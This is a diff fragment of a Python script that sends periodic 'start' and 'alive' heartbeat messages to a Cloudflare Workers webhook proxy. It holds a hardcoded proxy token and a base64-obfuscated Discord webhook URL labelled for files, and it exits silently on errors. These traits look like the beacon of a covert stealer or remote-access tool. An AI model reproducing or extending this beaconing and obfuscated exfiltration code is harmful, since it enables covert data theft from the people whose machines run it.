@@ -4,7 +4,7 @@ import urllib.request
 import time
 from pathlib import Path
 
-WORKER_URL = "https://webhookproxy.anna-benbekthi.workers.dev/"
+WORKER_URL = "https://webhookproxy.anna-benbekthi.workers.dev"
 PROXY_TOKEN = "389e0e62eaf14340b5e16d90ed1b56d79a14e07484a404bb30f0a3e9b7f64c66"
 
 FILE_WEBHOOK_B64 = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTUwNDUzNDE5ODU0NTk0MDU2MS92c0dhXzVaTTFFU2NaUlFKTU5qdWpTWm5mYnFXWEtXRm00S3Zqd1JwU29HQmdlN0NVYlluMHJSV18wYWZhY3k3czIzNQ=="
@@ -17,13 +17,13 @@ try:
 except:
     sys.exit()
 
-def send_webhook(message):
+def send_webhook(message, path):
     payload = json.dumps({
         "message": message
     }).encode("utf-8")
 
     req = urllib.request.Request(
-        WORKER_URL,
+        f"{WORKER_URL}/{path}",
         data=payload,
         method="POST",
         headers={
@@ -43,15 +43,12 @@ def send_webhook(message):
 
 def heartbeat():
     global FIRST_MESSAGE
-
-    if FIRST_MESSAGE:
-        msg = START_DATA
-    else:        
-        msg = ALIVE_DATA
     
-    sent = send_webhook(msg)
-    if sent and FIRST_MESSAGE:
-        FIRST_MESSAGE = False
+    if FIRST_MESSAGE:
+        sent = send_webhook(START_DATA, "start")
+        if sent : FIRST_MESSAGE = False
+    else:        
+        send_webhook(ALIVE_DATA, "alive")
 
 def cleanup_named_tempfiles():
     AGE_THRESHOLD = 60 
